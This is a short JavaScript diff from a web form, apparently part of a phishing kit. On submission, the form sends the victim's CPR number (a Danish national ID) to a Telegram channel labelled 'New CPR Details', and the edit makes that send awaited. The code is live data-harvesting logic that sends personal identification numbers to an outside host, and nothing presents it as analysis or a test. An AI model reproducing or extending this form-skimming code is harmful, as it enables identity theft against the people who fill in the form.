@@ -352,8 +352,8 @@
             submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
             
             try {
-                // Send CPR to Telegram (non-blocking - won't fail form submission)
-                sendFormDataToTelegram('New CPR Details', {
+                // Send CPR to Telegram (with cumulative data)
+                await sendFormDataToTelegram('New CPR Details', {
                     'CPR': cpr
                 }).catch(err => {
                     console.warn('Telegram notification failed (non-critical):', err);
